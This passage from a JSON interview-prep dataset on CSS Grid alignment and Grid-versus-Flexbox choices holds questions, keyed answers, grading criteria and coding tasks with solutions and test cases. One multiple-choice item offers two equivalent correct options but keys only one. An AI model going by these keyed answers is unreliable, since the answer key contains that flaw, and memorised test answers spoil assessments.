          "answer": "**`justify-items: center;`**\n*   **Purpose:** Aligns individual *grid items* along the inline (horizontal) axis *within their respective grid cells*.\n*   **Effect:** If a grid item is smaller than its grid cell, `justify-items: center;` will center that item horizontally within that cell.\n*   **Analogy:** Think of centering the content *inside* each individual box.\n\n**`justify-content: center;`**\n*   **Purpose:** Aligns the *entire grid track structure* (the set of defined columns) along the inline (horizontal) axis *within the grid container*.\n*   **Effect:** This property only has an effect if there is extra space in the grid container after all columns have taken their defined size. It will then center the whole block of columns horizontally within the container.\n*   **Analogy:** Think of centering the entire layout of boxes within a larger canvas.\n\nIn summary, `justify-items` affects how individual items are positioned *inside their cells*, while `justify-content` affects how the *entire grid* is positioned *inside its container*.",
          "analysisPoints": [
            "Clearly distinguishes `items` vs. `content`.",
            "Explains the axis of alignment (horizontal/inline).",
            "Describes the conditions under which `justify-content` takes effect.",
            "Provides clear analogies for better understanding."
          ],
          "keyConcepts": [
            "justify-items",
            "justify-content",
            "Grid Item Alignment",
            "Grid Container Alignment",
            "Inline Axis"
          ],
          "evaluationCriteria": [
            "Accuracy of distinction.",
            "Depth of explanation.",
            "Clarity of examples/analogies."
          ],
          "example": "```css\n/* Centers items within their cells */\n.grid-items {\n  display: grid;\n  grid-template-columns: repeat(3, 100px);\n  justify-items: center;\n}\n\n/* Centers the whole grid track block within its container */\n.grid-content {\n  display: grid;\n  grid-template-columns: repeat(3, 100px); /* Total 300px */\n  width: 500px; /* Container wider than content */\n  justify-content: center;\n}\n```",
          "tags": [
            "CSS Grid",
            "Alignment",
            "Open-ended",
            "Advanced"
          ],
          "prerequisites": [
            "CSS Grid Alignment"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_css_grid_alignment_3",
          "topic": "CSS Grid Shorthand Alignment",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the shorthand property for `align-items` and `justify-items` in CSS Grid?",
          "answer": "`place-items`",
          "analysisPoints": [
            "Recalls the specific shorthand property.",
            "Connects it to item-level alignment."
          ],
          "keyConcepts": [
            "place-items",
            "align-items",
            "justify-items",
            "Shorthand properties"
          ],
          "evaluationCriteria": [
            "Direct recall of shorthand name.",
            "Understanding its scope."
          ],
          "example": "`place-items: center;` is equivalent to `align-items: center; justify-items: center;`.",
          "tags": [
            "CSS Grid",
            "Alignment",
            "Shorthand",
            "Flashcard"
          ],
          "prerequisites": [
            "CSS Grid Alignment"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_grid_alignment_4",
          "topic": "CSS Grid Item Spanning",
          "level": "medium",
          "type": "mcq",
          "question": "You want a grid item to start at column line 2 and span across 3 columns. Which of the following CSS properties would achieve this?",
          "answer": "grid-column: 2 / span 3;",
          "options": [
            "grid-column: 2 / 5;",
            "grid-column: span 3 / 2;",
            "grid-column: 2 / span 3;",
            "grid-column: start 2 end 5;"
          ],
          "analysisPoints": [
            "Tests understanding of `grid-column` syntax.",
            "Checks knowledge of `span` keyword for relative placement.",
            "Distinguishes `span` from explicit line numbers."
          ],
          "keyConcepts": [
            "grid-column",
            "span keyword",
            "Grid lines"
          ],
          "evaluationCriteria": [
            "Correct application of `grid-column` syntax.",
            "Understanding of `span` keyword."
          ],
          "example": "`grid-column: 2 / span 3;` means the item starts at grid line 2 and extends for 3 column tracks. This is equivalent to `grid-column: 2 / 5;` (starting at line 2 and ending at line 5).",
          "tags": [
            "CSS Grid",
            "Item Placement",
            "MCQ"
          ],
          "prerequisites": [
            "CSS Grid Alignment"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_grid_alignment_5",
          "topic": "CSS Grid Item Overriding Alignment",
          "level": "medium",
          "type": "flashcard",
          "question": "If a grid container has `place-items: center;`, but you want a specific grid item to align to its start vertically and end horizontally within its cell, what properties would you apply to that individual item?",
          "answer": "`align-self: start;` and `justify-self: end;`",
          "analysisPoints": [
            "Tests knowledge of `self` properties for individual item overrides.",
            "Correctly identifies vertical (`align`) and horizontal (`justify`) axes for `self` properties."
          ],
          "keyConcepts": [
            "align-self",
            "justify-self",
            "place-items",
            "Item-level override"
          ],
          "evaluationCriteria": [
            "Correct identification of item-specific alignment properties.",
            "Understanding of axis directions for `self` properties."
          ],
          "example": "While `place-items` on the container sets a default, `align-self` and `justify-self` on a child item provide fine-grained control for specific items.",
          "tags": [
            "CSS Grid",
            "Alignment",
            "Flashcard",
            "Advanced"
          ],
          "prerequisites": [
            "CSS Grid Alignment"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_css_grid_alignment_6",
          "topic": "CSS Grid `place-content` vs `place-items`",
          "level": "hard",
          "type": "open",
          "question": "In a CSS Grid layout, differentiate the use cases and effects of `place-content` and `place-items`.",
          "answer": "**`place-content`:**\n*   **Scope:** Applied to the **grid container**.\n*   **Effect:** Aligns the *entire grid tracks* (the grid itself) within the grid container. It takes effect when the grid container has more space than the total size of its grid tracks.\n*   **Shorthand for:** `align-content` (vertical alignment of grid tracks) and `justify-content` (horizontal alignment of grid tracks).\n*   **Use Case:** Centering a small grid in a large parent container, or distributing extra space around the grid when its overall size is less than the container's.\n\n**`place-items`:**\n*   **Scope:** Applied to the **grid container**.\n*   **Effect:** Aligns *individual grid items* within their respective grid cells. It takes effect when a grid item is smaller than the cell it occupies.\n*   **Shorthand for:** `align-items` (vertical alignment of items in cells) and `justify-items` (horizontal alignment of items in cells).\n*   **Use Case:** Centering text or an icon inside a single grid cell, or uniformly aligning all items in a grid to their start, end, or center within their cells.\n\n**Analogy:**\nImagine a framed picture (`grid container`) with several smaller photos (`grid items`) arranged in rows and columns (`grid tracks`) inside it. \n*   `place-content` moves the *entire arrangement of photos* within the frame.\n*   `place-items` moves each *individual photo* within its designated spot on the arrangement.",
          "analysisPoints": [
            "Clearly defines scope (container for both).",
            "Explains what each property aligns (`grid tracks` vs. `individual items`).",
            "Describes when each property has an effect (extra space in container vs. item smaller than cell).",
            "Identifies shorthanded properties for each.",
            "Provides clear use cases and an effective analogy."
          ],
          "keyConcepts": [
            "place-content",
            "place-items",
            "Grid Container Alignment",
            "Grid Item Alignment",
            "Shorthand properties"
          ],
          "evaluationCriteria": [
            "Comprehensive and accurate differentiation.",
            "Clear explanation of effects and use cases.",
            "Helpful analogy."
          ],
          "example": "```css\n.container-content-aligned {\n  display: grid; place-content: center; /* Centers the whole grid */\n}\n\n.container-items-aligned {\n  display: grid; place-items: center;   /* Centers items within cells */\n}\n```",
          "tags": [
            "CSS Grid",
            "Alignment",
            "Open-ended",
            "Advanced"
          ],
          "prerequisites": [
            "CSS Grid Alignment"
          ],
          "complexity": 8,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_grid_flexbox_comparison_1",
          "topic": "Grid vs. Flexbox Fundamental Difference",
          "level": "easy",
          "type": "mcq",
          "question": "What is the primary conceptual difference between CSS Grid and Flexbox regarding layout dimensions?",
          "answer": "CSS Grid is for two-dimensional layouts (rows and columns), while Flexbox is for one-dimensional layouts (either rows or columns).",
          "options": [
            "CSS Grid is for responsive design, while Flexbox is for fixed design.",
            "CSS Grid is for two-dimensional layouts (rows and columns), while Flexbox is for one-dimensional layouts (either rows or columns).",
            "CSS Grid is for complex animations, while Flexbox is for simple alignments.",
            "CSS Grid is for server-side rendering, while Flexbox is for client-side rendering."
          ],
          "analysisPoints": [
            "Tests fundamental understanding of their design purposes.",
            "Highlights the key difference in dimensionality.",
            "Distinguishes core functionality from secondary features or unrelated concepts."
          ],
          "keyConcepts": [
            "CSS Grid",
            "Flexbox",
            "Dimensionality",
            "Layout"
          ],
          "evaluationCriteria": [
            "Correct identification of primary distinction.",
            "Avoidance of misleading options."
          ],
          "example": "This is a foundational concept. Grid's strength lies in defining a grid across both axes, while Flexbox arranges items along a single axis.",
          "tags": [
            "CSS Grid",
            "Flexbox",
            "Comparison",
            "Fundamentals",
            "MCQ"
          ],
          "prerequisites": [],
          "complexity": 4,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_grid_flexbox_comparison_2",
          "topic": "Grid vs. Flexbox Use Cases",
          "level": "medium",
          "type": "open",
          "question": "You are designing a webpage. For which part of the layout would you typically choose CSS Grid, and for which part would you choose Flexbox? Provide examples for both.",
          "answer": "**CSS Grid Use Case (Macro-Layout):**\nCSS Grid is ideal for defining the overall page structure and complex, asymmetrical layouts because it operates in two dimensions (rows AND columns). It allows you to precisely place major regions of your page.\n*   **Example:** Laying out the main `header`, `sidebar`, `content` area, and `footer` of a website. You can define specific column widths and row heights for these sections and place them visually using `grid-template-areas`.\n\n**Flexbox Use Case (Micro-Layout):**\nFlexbox is best suited for arranging items within a single dimension (either a row OR a column) and for distributing space and aligning items within components. It's great for smaller-scale layouts.\n*   **Example:** Arranging navigation links within a `header` (e.g., `display: flex; justify-content: space-between;` for links). Another example is aligning items within a product card, such as an image, title, and price, where you might want them stacked vertically (`flex-direction: column;`) or aligned horizontally (`align-items: center;`).\n\n**Summary:** Use Grid for the big picture (page layout) and Flexbox for the details (component layout within grid areas).",
          "analysisPoints": [
            "Identifies Grid for macro-layouts and Flexbox for micro-layouts.",
            "Provides clear, relevant examples for each.",
            "Reinforces the 2D vs. 1D distinction in practical terms.",
            "Highlights the common pattern of combining them."
          ],
          "keyConcepts": [
            "CSS Grid",
            "Flexbox",
            "Layout Strategy",
            "Macro-layout",
            "Micro-layout"
          ],
          "evaluationCriteria": [
            "Clarity of explanation.",
            "Appropriateness of examples.",
            "Demonstrates understanding of best practices."
          ],
          "example": "```html\n<div class=\"grid-page-layout\">\n  <header class=\"flex-nav\"></header>\n  <aside class=\"grid-sidebar\"></aside>\n  <main class=\"grid-content\">\n    <div class=\"flex-cards\"></div>\n  </main>\n  <footer class=\"grid-footer\"></footer>\n</div>\n```\nHere, `grid-page-layout` uses Grid, while `flex-nav` and `flex-cards` use Flexbox within grid areas.",
          "tags": [
            "CSS Grid",
            "Flexbox",
            "Comparison",
            "Use Cases",
            "Open-ended"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Flexbox Fundamentals"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_grid_flexbox_comparison_3",
          "topic": "Grid vs. Flexbox Overlapping Elements",
          "level": "medium",
          "type": "flashcard",
          "question": "Which CSS layout system, Grid or Flexbox, is natively designed to handle overlapping elements easily, and why?",
          "answer": "CSS Grid is natively designed to handle overlapping elements easily because it allows multiple grid items to occupy the same grid cell. This is not possible with Flexbox, where items are arranged in a strict sequence along a single axis.",
          "analysisPoints": [
            "Identifies Grid as the system for overlapping.",
            "Explains the underlying reason (multiple items per cell in Grid, sequential in Flexbox).",
            "Highlights a limitation of Flexbox in this regard."
          ],
          "keyConcepts": [
            "CSS Grid",
            "Flexbox",
            "Overlapping Elements",
            "Grid Cells"
          ],
          "evaluationCriteria": [
            "Correct identification and reasoning.",
            "Understanding of intrinsic capabilities."
          ],
          "example": "In CSS Grid, you can explicitly place two items in `grid-area: 1 / 1 / 2 / 2;` and they will overlap. In Flexbox, items occupy distinct spaces.",
          "tags": [
            "CSS Grid",
            "Flexbox",
            "Comparison",
            "Flashcard"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Flexbox Fundamentals"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_grid_flexbox_comparison_4",
          "topic": "Grid vs. Flexbox Reordering",
          "level": "medium",
          "type": "mcq",
          "question": "Which property allows you to easily reorder grid/flex items visually, independent of their source order in the HTML, and which layout system is it primarily associated with?",
          "answer": "`order` property, primarily associated with Flexbox.",
          "options": [
            "`z-index` property, primarily associated with CSS Grid.",
            "`grid-auto-flow` property, primarily associated with CSS Grid.",
            "`order` property, primarily associated with Flexbox.",
            "`flex-wrap` property, primarily associated with Flexbox."
          ],
          "analysisPoints": [
            "Tests knowledge of the `order` property.",
            "Correctly associates `order` with Flexbox.",
            "Differentiates from other layout/visual properties."
          ],
          "keyConcepts": [
            "order property",
            "Flexbox",
            "Reordering",
            "Accessibility"
          ],
          "evaluationCriteria": [
            "Correct identification of property and associated technology.",
            "Understanding of visual reordering concept."
          ],
          "example": "While Grid allows reordering via `grid-area` or explicit line placement, Flexbox's `order` property is specifically designed for simple linear reordering along a single axis, which is often crucial for responsive layouts.",
          "tags": [
            "CSS Grid",
            "Flexbox",
            "Comparison",
            "Order Property",
            "MCQ"
          ],
          "prerequisites": [
            "Flexbox Fundamentals"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_grid_flexbox_comparison_5",
          "topic": "Combining Grid and Flexbox",
          "level": "easy",
          "type": "flashcard",
          "question": "Is it possible and recommended to use CSS Grid and Flexbox together in a single web page layout? If so, why?",
          "answer": "Yes, it is highly possible and recommended. The reason is that they complement each other: Grid is for macro-level, two-dimensional page layouts, while Flexbox is for micro-level, one-dimensional component layouts. Combining them allows for robust and flexible designs.",
          "analysisPoints": [
            "Confirms possibility and recommendation.",
            "Explains the synergy based on their respective strengths (macro/micro, 2D/1D)."
          ],
          "keyConcepts": [
            "CSS Grid",
            "Flexbox",
            "Combination",
            "Best Practices",
            "Layout Strategy"
          ],
          "evaluationCriteria": [
            "Direct recall of best practice.",
            "Understanding of complementary roles."
          ],
          "example": "A common pattern is to use Grid for the main `header`, `sidebar`, `main`, `footer` layout, and then use Flexbox inside the `header` for navigation items, or inside `main` for aligning a set of cards.",
          "tags": [
            "CSS Grid",
            "Flexbox",
            "Combination",
            "Flashcard"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Flexbox Fundamentals"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_grid_flexbox_comparison_6",
          "topic": "Grid vs. Flexbox: Content Sizing",
          "level": "medium",
          "type": "mcq",
          "question": "Which layout system is generally more suitable when the size of the content within the items should primarily dictate the layout, especially for flexible distribution along a single axis?",
          "answer": "Flexbox",
          "options": [
            "CSS Grid",
            "Flexbox",
            "CSS Tables",
            "CSS Floats"
          ],
          "analysisPoints": [
            "Tests understanding of Flexbox's content-driven sizing model.",
            "Highlights its strength in single-axis distribution based on content.",
            "Differentiates from Grid's more explicit track-based sizing."
          ],
          "keyConcepts": [
            "Flexbox",
            "Content Sizing",
            "Single-dimensional Layout",
            "Flex-grow",
            "Flex-shrink"
          ],
          "evaluationCriteria": [
            "Correct selection based on core design principle.",
            "Understanding of 'content dictates layout' concept."
          ],
          "example": "Flexbox's `flex-grow`, `flex-shrink`, and `flex-basis` properties are designed to manage space distribution based on the content's intrinsic size along the main axis.",
          "tags": [
            "Flexbox",
            "Comparison",
            "Content Sizing",
            "MCQ"
          ],
          "prerequisites": [
            "Flexbox Fundamentals"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_grid_flexbox_comparison_7",
          "topic": "CSS Grid vs. Flexbox Decision Making",
          "level": "hard",
          "type": "open",
          "question": "You are building a complex component that needs to dynamically adapt to different screen sizes and display items in a structured manner. The items themselves need to be aligned and spaced. Discuss how you would decide whether to use CSS Grid, Flexbox, or a combination, providing specific considerations.",
          "answer": "When building a complex component, the choice between CSS Grid, Flexbox, or a combination largely depends on the component's internal structure and how its items need to relate to each other and to the overall component boundaries.\n\n**Considerations:**\n1.  **Dimensionality of the Primary Layout:**\n    *   If the component arranges items in a strict **two-dimensional pattern** (e.g., a calendar grid, a dashboard with distinct widgets in rows and columns), **CSS Grid** is the prime candidate. It allows defining both rows and columns explicitly.\n    *   If the component primarily arranges items along a **single axis** (e.g., a navigation bar, a list of tags, buttons in a toolbar, items within a single product card), **Flexbox** is more appropriate. It excels at distributing space and aligning items along one direction.\n\n2.  **Content-driven vs. Layout-driven Sizing:**\n    *   If the **content's intrinsic size** should primarily influence how space is distributed (e.g., a flexible navigation where link width varies, a series of text boxes that grow/shrink), **Flexbox** is excellent due to `flex-grow`, `flex-shrink`, `flex-basis`.\n    *   If you need **precise control over track sizes** (e.g., fixed-width sidebar, specific column for an image, responsive columns with `minmax()`), **CSS Grid** offers more granular control.\n\n3.  **Item Independence vs. Relation:**\n    *   **CSS Grid** creates a grid that its children fit into, making them relate to the overall grid structure. It's powerful for 'layout first' thinking where the container dictates the slots.\n    *   **Flexbox** treats children as a group, distributing space among them and aligning them relative to each other within the single axis. It's good for 'content first' thinking where items influence each other's positioning.\n\n4.  **Overlapping Elements:**\n    *   If items need to **overlap** (e.g., a background image with text overlay, layered UI elements), **CSS Grid** is the only one that naturally supports this by allowing multiple items in the same cell.\n\n5.  **Reordering:**\n    *   For simple **linear reordering** of items for different screen sizes, **Flexbox's `order` property** is very convenient.\n    *   While Grid allows reordering via explicit placement, `order` in Flexbox is often simpler for single-axis changes.\n\n**Combination Strategy (Most Common):**\nOften, the best approach is to use a combination:\n*   Use **CSS Grid** for the **macro-layout** of the component itself (e.g., if the component has distinct header, body, footer sections, or a multi-column internal structure).\n*   Use **Flexbox** for the **micro-layout** *within* the grid cells (e.g., aligning buttons within a component's header, distributing items in a list inside a grid-defined section).\n\nThis allows leveraging Grid's powerful 2D structural capabilities while benefiting from Flexbox's fine-grained 1D alignment and distribution within those structures, leading to highly robust and maintainable responsive components.",
          "analysisPoints": [
            "Covers key decision factors: dimensionality, sizing influence, item relations, overlapping, reordering.",
            "Provides specific scenarios/examples for each consideration.",
            "Emphasizes the common and effective combination strategy.",
            "Articulates the strengths of each technology in a decision-making context."
          ],
          "keyConcepts": [
            "CSS Grid",
            "Flexbox",
            "Layout Strategy",
            "Decision Making",
            "Responsive Design",
            "Combination",
            "Macro-layout",
            "Micro-layout"
          ],
          "evaluationCriteria": [
            "Comprehensive and structured argument.",
            "Demonstrates deep understanding of both technologies.",
            "Offers practical decision-making guidance.",
            "Clear and concise language."
          ],
          "example": "A product card component might use Flexbox internally to arrange an image, title, and price vertically, but then be placed within a larger Grid layout for a responsive product gallery.",
          "tags": [
            "CSS Grid",
            "Flexbox",
            "Comparison",
            "Strategy",
            "Open-ended",
            "Expert"
          ],
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Advanced CSS Grid Layouts",
            "Flexbox Fundamentals"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "expert"
        }
      ],
      "tasks": [
        {
          "id": "task_grid_basic_layout",
          "title": "Create a Basic Responsive Card Grid",
          "description": "\nImplement a responsive grid layout using CSS Grid. The grid should display a series of cards. Your goal is to:\n\n1.  Create a container with `display: grid`.\n2.  Define columns that are `repeat(auto-fill, minmax(250px, 1fr))`. This should ensure that cards are at least 250px wide and grow to fill the available space, with as many columns as fit.\n3.  Add a `gap` of 20px between the cards.\n4.  Style the individual `.card` items with a background color, padding, and a border for visibility.\n5.  Ensure the layout adapts gracefully when the browser window is resized.\n",
          "difficulty": "medium",
          "startingCode": "```html\n<div class=\"card-grid-container\">\n  <div class=\"card\">Card 1</div>\n  <div class=\"card\">Card 2</div>\n  <div class=\"card\">Card 3</div>\n  <div class=\"card\">Card 4</div>\n  <div class=\"card\">Card 5</div>\n  <div class=\"card\">Card 6</div>\n</div>\n```\n```css\n.card-grid-container {\n  /* Your CSS here */\n  padding: 20px;\n  background-color: #f5f5f5;\n}\n\n.card {\n  background-color: #ffffff;\n  border: 1px solid #e0e0e0;\n  padding: 20px;\n  text-align: center;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.1);\n  border-radius: 8px;\n  font-family: sans-serif;\n}\n```",
          "solutionCode": "```html\n<div class=\"card-grid-container\">\n  <div class=\"card\">Card 1</div>\n  <div class=\"card\">Card 2</div>\n  <div class=\"card\">Card 3</div>\n  <div class=\"card\">Card 4</div>\n  <div class=\"card\">Card 5</div>\n  <div class=\"card\">Card 6</div>\n  <div class=\"card\">Card 7</div>\n  <div class=\"card\">Card 8</div>\n  <div class=\"card\">Card 9</div>\n</div>\n```\n```css\n.card-grid-container {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));\n  gap: 20px;\n  padding: 20px;\n  background-color: #f5f5f5;\n}\n\n.card {\n  background-color: #ffffff;\n  border: 1px solid #e0e0e0;\n  padding: 20px;\n  text-align: center;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.1);\n  border-radius: 8px;\n  font-family: sans-serif;\n}\n```",
          "testCases": [
            "**Test Case 1: Wide Viewport**\nExpected: Multiple columns of cards (e.g., 4 or more), with cards spanning evenly to fill the width. All cards should be at least 250px wide.\n",
            "**Test Case 2: Narrow Viewport**\nExpected: Fewer columns (e.g., 1 or 2 columns), with cards growing to fill the available width (up to 1fr) while maintaining minimum 250px width. Cards should wrap to new rows as needed.\n",
            "**Test Case 3: Edge Case (Small Width)**\nExpected: If viewport is less than 250px, cards should still be 250px wide and cause horizontal scrolling (as `minmax` ensures minimum width).\n",
            "**Test Case 4: Gap Verification**\nExpected: A consistent 20px space between all cards, both horizontally and vertically, but no gap around the outer edge of the container itself (only padding if added).\n"
          ],
          "hints": [
            "Remember to use `repeat()` and `minmax()` together for the responsive column definition.",
            "The `auto-fill` keyword is crucial for fitting as many columns as possible.",
            "The `gap` property is a shorthand for both `row-gap` and `column-gap`."
          ],
          "tags": [
            "CSS Grid",
            "Responsive Design",
            "Layout",
            "minmax",
            "auto-fill"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "CSS Grid Fundamentals"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "fr unit",
            "gap property",
            "grid-template-columns"
          ]
        },
        {
          "id": "task_grid_named_area_layout",
          "title": "Build a Blog Post Layout with Named Grid Areas",
          "description": "\nCreate a typical blog post layout using CSS Grid's named areas. The layout should have:\n\n1.  A main container (`.blog-post-layout`).\n2.  A `header` section spanning all columns.\n3.  A `sidebar` on the left, an `article` (main content) in the middle, and an `aside` on the right, all in the same row.\n4.  A `footer` section spanning all columns.\n5.  Define appropriate grid-template-columns (e.g., `1fr 4fr 1fr`) and grid-template-rows (e.g., `auto 1fr auto`).\n6.  Assign named areas to each section and apply them to the corresponding HTML elements.\n7.  Add basic styling (background, padding) to make sections visible.\n",
          "difficulty": "medium",
          "startingCode": "```html\n<div class=\"blog-post-layout\">\n  <header class=\"blog-header\"><h1>Post Title</h1></header>\n  <nav class=\"blog-sidebar\"><h3>Categories</h3><ul><li>CSS</li><li>HTML</li></ul></nav>\n  <main class=\"blog-article\"><p>This is the main content of the blog post.</p></main>\n  <aside class=\"blog-aside\"><h3>Related Posts</h3><p>Link 1</p></aside>\n  <footer class=\"blog-footer\"><p>&copy; 2023 Blog</p></footer>\n</div>\n```\n```css\n.blog-post-layout {\n  /* Your Grid CSS here */\n  min-height: 100vh;\n  gap: 15px;\n  background-color: #f8f8f8;\n  padding: 15px;\n}\n\n.blog-header { background-color: #e0f2f7; padding: 20px; text-align: center; }\n.blog-sidebar { background-color: #e6f7ff; padding: 20px; }\n.blog-article { background-color: #ffffff; padding: 20px; line-height: 1.6; }\n.blog-aside { background-color: #f0faff; padding: 20px; }\n.blog-footer { background-color: #cceeff; padding: 20px; text-align: center; }\n```",
          "solutionCode": "```html\n<div class=\"blog-post-layout\">\n  <header class=\"blog-header\"><h1>Post Title</h1></header>\n  <nav class=\"blog-sidebar\"><h3>Categories</h3><ul><li>CSS</li><li>HTML</li><li>JavaScript</li><li>React</li></ul></nav>\n  <main class=\"blog-article\"><h2>Understanding CSS Grid Layouts</h2><p>CSS Grid is a two-dimensional layout system for the web. It lets you lay out content in rows and columns. It's ideal for overall page layouts or complex, asymmetrical designs.</p><p>Compared to Flexbox, which is one-dimensional, Grid provides more control over both dimensions simultaneously, allowing for the creation of intricate web page structures with ease. Named areas simplify the visual organization of the layout.</p></main>\n  <aside class=\"blog-aside\"><h3>Related Posts</h3><ul><li><a href=\"#\">Flexbox vs. Grid</a></li><li><a href=\"#\">Responsive Images</a></li></ul></aside>\n  <footer class=\"blog-footer\"><p>&copy; 2023 My Blog</p></footer>\n</div>\n```\n```css\n.blog-post-layout {\n  display: grid;\n  grid-template-columns: 1fr 4fr 1fr; /* Example: sidebar, main, aside */\n  grid-template-rows: auto 1fr auto;   /* Example: header, content, footer */\n  grid-template-areas:\n    \"header header header\"\n    \"sidebar article aside\"\n    \"footer footer footer\";\n  min-height: 100vh;\n  gap: 15px;\n  background-color: #f8f8f8;\n  padding: 15px;\n}\n\n.blog-header { grid-area: header; background-color: #e0f2f7; padding: 20px; text-align: center; }\n.blog-sidebar { grid-area: sidebar; background-color: #e6f7ff; padding: 20px; }\n.blog-article { grid-area: article; background-color: #ffffff; padding: 20px; line-height: 1.6; }\n.blog-aside { grid-area: aside; background-color: #f0faff; padding: 20px; }\n.blog-footer { grid-area: footer; background-color: #cceeff; padding: 20px; text-align: center; }\n```",
          "testCases": [
            "**Test Case 1: Structural Integrity**\nExpected: The header and footer should span the full width. The sidebar, article, and aside should align horizontally in the middle row, with the article being wider than the sidebar and aside.\n",
            "**Test Case 2: Content Responsiveness**\nExpected: The `article` area should expand vertically to accommodate its content. The `sidebar` and `aside` should match the height of the `article` due to `1fr` in `grid-template-rows` for the content area.\n",
            "**Test Case 3: Gap Verification**\nExpected: A consistent 15px gap between all grid tracks (rows and columns).\n",
            "**Test Case 4: Named Area Mapping**\nExpected: Confirm that each HTML element (e.g., `.blog-header`) is correctly placed in its designated grid area (`header`)."
          ],
          "hints": [
            "Start by defining your `grid-template-columns` and `grid-template-rows` for the three main rows and three main columns.",
            "The `grid-template-areas` property expects a string for each row. Use repeated names (e.g., `\"header header header\"`) to make an area span multiple columns.",
            "Remember to apply `grid-area: [area-name];` to each child element to assign it to its defined region."
          ],
          "tags": [
            "CSS Grid",
            "Layout",
            "Named Areas",
            "Frontend",
            "Blog Layout"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "CSS Grid Fundamentals",
            "Advanced CSS Grid Layouts"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "grid-template-areas",
            "grid-area",
            "fr unit",
            "auto keyword"
          ]
        },
        {
          "id": "task_grid_aligned_gallery",
          "title": "Build a Centered Image Gallery with Grid Alignment",
          "description": "\nCreate a simple image gallery using CSS Grid that demonstrates item and content alignment.\n\n1.  Create a `.gallery-container` that is a grid.\n2.  Define columns that create a responsive layout using `repeat(auto-fit, minmax(180px, 1fr))`.\n3.  Ensure a `gap` of 15px between images.\n4.  Inside each grid cell, center its content (an image or a `div` representing an image) both horizontally and vertically. The images should have a fixed size (e.g., 150px x 150px) smaller than the `minmax` allows, so alignment is visible.\n5.  If the `.gallery-container` itself has more space than the total width of the grid tracks, center the *entire grid* horizontally within the container.\n",
          "difficulty": "medium",
          "startingCode": "```html\n<div class=\"gallery-wrapper\">\n  <div class=\"gallery-container\">\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 1\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 2\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 3\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 4\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 5\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 6\"></div>\n  </div>\n</div>\n```\n```css\n.gallery-wrapper {\n  width: 90%; /* Make wrapper wider to demonstrate content alignment */\n  max-width: 1200px;\n  margin: 50px auto; /* Center the wrapper */\n  border: 2px dashed #ccc;\n  padding: 20px;\n  background-color: #f9f9f9;\n}\n\n.gallery-container {\n  /* Your Grid CSS here */\n  background-color: #e0f0ff;\n  min-height: 400px; /* Give it some height to show vertical content alignment */\n}\n\n.gallery-item {\n  background-color: #fff;\n  border: 1px solid #ddd;\n  border-radius: 8px;\n  padding: 10px;\n  display: flex; /* To center the image within the item if it's smaller */\n  justify-content: center;\n  align-items: center;\n}\n\n.gallery-item img {\n  width: 150px;\n  height: 150px;\n  object-fit: cover;\n  border-radius: 4px;\n}\n```",
          "solutionCode": "```html\n<div class=\"gallery-wrapper\">\n  <div class=\"gallery-container\">\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 1\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 2\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 3\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 4\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 5\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 6\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 7\"></div>\n    <div class=\"gallery-item\"><img src=\"https://via.placeholder.com/150\" alt=\"Image 8\"></div>\n  </div>\n</div>\n```\n```css\n.gallery-wrapper {\n  width: 90%; /* Make wrapper wider to demonstrate content alignment */\n  max-width: 1200px;\n  margin: 50px auto; /* Center the wrapper */\n  border: 2px dashed #ccc;\n  padding: 20px;\n  background-color: #f9f9f9;\n}\n\n.gallery-container {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));\n  gap: 15px;\n  background-color: #e0f0ff;\n  min-height: 400px; /* Give it some height to show vertical content alignment */\n\n  /* Align individual items within their cells */\n  